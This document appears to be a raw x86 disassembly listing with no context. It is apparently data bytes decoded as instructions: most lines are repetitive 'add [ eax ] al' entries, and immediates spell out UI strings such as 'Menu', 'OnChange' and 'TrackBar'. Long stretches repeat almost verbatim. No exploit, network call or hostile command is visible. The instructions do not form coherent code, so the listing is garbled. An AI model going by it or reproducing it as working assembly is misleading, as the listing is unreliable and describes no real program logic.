add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al 0x91
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cwde
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
push ss
inc ecx
add [ edi + ebp * 8 + 0x44 ] cl
add [ edi + ebp * 8 + 0x44 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
pushfd
add al 0x91
inc esp
add [ ebx + ebx * 4 ] dl
shl [ ecx + 0x33ec0041 ] 0x40
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
mov al [ 0x700449a ]
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
[ edi ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
adc eax 0x300041
add bh bh
sbb bh ah
inc esp
add [ eax ] dl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x800449d
add [ eax ] al
add ah ch
inc ebx
inc edx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
cdq
inc ebx
push 0x65676e61
or [ edi ] dl
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
xor eax [ eax ]
add [ esp + ebx + 0x33e00041 ] cl
inc eax
add ah ch
outsb
adc [ edi + 0x500044 ] cl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
je r-xdata
add al ah
xor eax [ eax ]
in al dx
shl al 0x9c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 4 + 0x140044 ] al
add [ eax ] al
mov [ ecx + eax * 2 ] ds
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add bh bh
xor al 0xe3
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
cdq
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
sub_4493a6
inc esp
add [ eax + 0x10044cc ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x448ed070
add [ eax ] cl
add bh bh
cld
lds eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
call eax
mov [ eax + eax + 0x20 ] 0xcf
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
adc [ eax ] al
aas
add [ eax ] al
dec [ eax - 0x39 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
jl r-xdata
adc [ eax ] al
cmp eax 0x70ff0000
int 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xf06d6574
push ss
inc ecx
add [ eax ] ah
add bh bh
fadd st7
inc esp
add [ eax + 0x44cf ] ah
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
dec ecx
outsb
js r-xdata
pop es
add [ 0x61657242 ] al
imul esp [ eax + edx + 0x300040 ] 0x0
dec [ esi + eax * 8 ]
inc esp
add al ah
into
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add [ eax ] al
inc esp
add [ eax ] al
iretd
cwde
inc ebx
jne r-xdata
add bh bh
push ss
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
jmp [ eax - 0x31 ]
inc ecx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ eax - 0x1d ] dh
inc ecx
add ah dh
xor eax [ eax ]
adc al 0x9b
ja r-xdata
outsb
jne r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ah
add [ eax ] al
add eax [ eax ]
std
add dl al
xchg esi eax
inc esp
add dh dl
xchg esi eax
inc esp
add [ eax ] bl
add [ eax ] al
loopne r-xdata
je r-xdata
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ eax ] eax
call 0x3444db90
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
xor eax [ eax ]
call 0x3044d69c
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
inc ecx
add al cl
popfd
insd
dec esp
nop
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
dec ebp
outsb
jne r-xdata
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x1753ffbc ] bh
inc esp
add al dh
out 0x44 eax
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shl [ edi + edx * 4 + 0x9070044 ] 0x54
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x68756e65
mov al 0x9e
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
jae r-xdata
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
rcr [ esi - 0x6147ffbf ] 0x41
add al ah
jb r-xdata
add [ eax ] al
xchg edi eax
inc esp
add ah bl
xchg esi eax
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ eax + 0x10044e7 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ ecx + edx * 4 ] al
inc esp
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
loop r-xdata
add [ eax ] al
fild [ eax + eax - 0x14 ]
inc eax
add [ eax - 0x69 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
xchg edi eax
inc esp
add [ eax ] ah
add [ eax ] al
sub [ esi - 0x5e3fffbc ] dl
inc ecx
add ah ch
xor eax [ eax ]
adc al 0x9b
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044d790
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
dec ecx
je r-xdata
inc eax
add [ ecx ] al
add bh bh
sub al 0xe7
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
dec ebp
jb r-xdata
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
sahf
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
lea eax [ eax ]
je r-xdata
je r-xdata
outsb
je r-xdata
popad
rcl [ gs : 0x300041 ] 0x0
[ eax ]
out 0x44 eax
add [ eax ] dl
loopne r-xdata
add [ eax ] cl
add bh bh
xor al 0xe3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
jns r-xdata
add [ eax ] al
adc [ 0x6e4f0a00 ] 0x44
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffbb6a ] dh
jl r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
pop [ eax + eax + 0x50 ]
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
inc ecx
add [ eax ] al
[ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
adc [ eax ] al
inc eax
add [ eax ] al
add al 0x91
inc esp
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
xchg esi eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
inc esp
add [ 0x654c616d ] cl
je r-xdata
inc eax
cdq
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec esp
je r-xdata
dec ebp
outsb
sbb [ ecx + 0xf030044 ] 0x54
jo r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
add [ ecx + 0xf030044 ] bl
push esp
push eax
outsd
jb r-xdata
insd
popad
jae r-xdata
dec ecx
call eax
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jae r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
cdq
inc esp
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsb
je r-xdata
ja r-xdata
mov al 0x96
inc esp
add al ah
add [ eax ] al
insd
aam 0x8f
inc esp
add [ eax - 0x67010000 ] bl
add [ edi ] al
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffee900041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
loop r-xdata
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
inc esp
add [ eax ] bh
inc edi
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ ecx + esi + 0x40 ] cl
add [ edi + ebp * 8 ] al
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
cwde
inc esp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
cld
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] bh
out dx eax
inc esp
add al dh
out dx eax
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7800449a ] dl
add [ eax ] al
add [ eax ] ch
xchg esi eax
inc esp
add al al
mov eax [ 0x33ec0041 ]
inc eax
outsd
inc edx
outsd
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ebx * 4 ] bh
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add al 0x0
add [ eax ] al
outsb
jne r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
call 0x644de82
je r-xdata
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + eax ] al
0x96dc0044 0x44
adc [ eax ] al
add eax 0x756e654d
jae r-xdata
jns r-xdata
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
jo r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jne r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044da74
xor [ eax ] eax
dec esp
xor [ eax ] eax
add al 0xef
xor eax [ eax ]
adc al 0x9b
add [ ebp - 0x65b3ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ ecx + ebx * 4 + 0x44 ] edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449a ] ah
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
clc
loope r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al 0x91
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cwde
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
push ss
inc ecx
add [ edi + ebp * 8 + 0x44 ] cl
add [ edi + ebp * 8 + 0x44 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
pushfd
add al 0x91
inc esp
add [ ebx + ebx * 4 ] dl
shl [ ecx + 0x33ec0041 ] 0x40
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
mov al [ 0x700449a ]
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
[ edi ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
adc eax 0x300041
add bh bh
sbb bh ah
inc esp
add [ eax ] dl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x800449d
add [ eax ] al
add ah ch
inc ebx
inc edx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
cdq
inc ebx
push 0x65676e61
or [ edi ] dl
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
xor eax [ eax ]
add [ esp + ebx + 0x33e00041 ] cl
inc eax
add ah ch
outsb
adc [ edi + 0x500044 ] cl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
je r-xdata
add al ah
xor eax [ eax ]
in al dx
shl al 0x9c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 4 + 0x140044 ] al
add [ eax ] al
mov [ ecx + eax * 2 ] ds
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add bh bh
xor al 0xe3
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
cdq
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
sub_4494c4
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
adc [ eax ] al
cmp eax 0x70ff0000
int 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xf06d6574
push ss
inc ecx
add [ eax ] ah
add bh bh
fadd st7
inc esp
add [ eax + 0x44cf ] ah
outsd
dec ecx
je r-xdata
js r-xdata
cwde
inc ebx
jne r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
insd
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
mov al [ 0x44cf ]
movsb [ edi ] [ esi ]
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
inc eax
iretd
inc ecx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ eax - 0x1d ] dh
inc ecx
add ah dh
xor eax [ eax ]
adc al 0x9b
ja r-xdata
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
outsb
jne r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ah
add [ eax ] al
add eax [ eax ]
std
add dl al
xchg esi eax
inc esp
add dh dl
xchg esi eax
inc esp
add [ eax ] bl
add [ eax ] al
loopne r-xdata
je r-xdata
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
rcr [ esi - 0x6147ffbf ] 0x41
add al ah
jb r-xdata
mov al 0x96
inc esp
add al ah
add [ eax ] al
insd
aam 0x8f
inc esp
add [ eax - 0x67010000 ] bl
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ eax ] eax
call 0x3444db90
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
xor eax [ eax ]
call 0x3044d69c
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
inc ecx
add al cl
popfd
jae r-xdata
insd
dec esp
nop
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
dec ecx
je r-xdata
dec ebp
outsb
jne r-xdata
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x1753ffbc ] bh
inc esp
add al dh
out 0x44 eax
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shl [ edi + edx * 4 + 0x9070044 ] 0x54
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x68756e65
mov al 0x9e
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
jae r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
sahf
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
lea eax [ eax ]
je r-xdata
add [ eax ] al
xchg edi eax
inc esp
add ah bl
xchg esi eax
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ eax + 0x10044e7 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ ecx + edx * 4 ] al
inc esp
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
loop r-xdata
add [ eax ] al
fild [ eax + eax - 0x14 ]
inc eax
add [ eax - 0x69 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
xchg edi eax
inc esp
add [ eax ] ah
add [ eax ] al
sub [ esi - 0x5e3fffbc ] dl
inc ecx
add ah ch
xor eax [ eax ]
adc al 0x9b
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044d790
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
jb r-xdata
add [ eax ] al
adc [ 0x6e4f0a00 ] 0x44
xchg esi eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffbb6a ] dh
inc eax
add [ ecx ] al
add bh bh
sub al 0xe7
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
dec ebp
jb r-xdata
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
je r-xdata
outsb
je r-xdata
popad
rcl [ gs : 0x300041 ] 0x0
[ eax ]
out 0x44 eax
add [ eax ] dl
loopne r-xdata
add [ eax ] cl
add bh bh
xor al 0xe3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
jns r-xdata
jl r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
pop [ eax + eax + 0x50 ]
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
inc ecx
add [ eax ] al
[ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
adc [ eax ] al
inc eax
add [ eax ] al
add al 0x91
inc esp
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
inc esp
add [ 0x654c616d ] cl
je r-xdata
inc eax
cdq
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec esp
je r-xdata
dec ebp
outsb
sbb [ ecx + 0xf030044 ] 0x54
jo r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
add [ ecx + 0xf030044 ] bl
push esp
push eax
outsd
jb r-xdata
insd
popad
jae r-xdata
dec ecx
call eax
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
dec esp
